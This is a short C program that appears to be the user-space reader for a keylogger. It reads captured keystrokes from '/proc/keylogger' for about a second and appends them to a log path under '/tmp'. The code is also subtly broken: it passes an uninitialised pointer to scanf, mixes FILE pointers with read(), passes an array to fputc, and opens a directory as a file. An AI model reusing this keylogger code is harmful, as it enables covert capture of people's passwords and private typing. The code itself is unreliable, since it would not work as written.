#include <stdio.h>
#include <strings.h>
#include <time.h>
#define DEVICE "/proc/keylogger"


int main()
{
    printf("enter R for read the keystrokes");
    char *c, read_buf[100];
    scanf("%c", c);
    FILE *fd = fopen(DEVICE, "a+");
    FILE *fd_logs =fopen("/tmp", "a+");
    if (*c == 'R'){
        int msec=0, trigger=1000;/*10ms*10*/
        clock_t before = clock();
        do{
            read(fd, read_buf, sizeof(read_buf));
            if(read_buf != NULL)
                fputc(read_buf, fd_logs);
        clock_t difference = clock()-before;
        msec = difference*1000 /CLOCKS_PER_SEC;
        }while (msec<trigger);
        
        
    }
    return 0;
}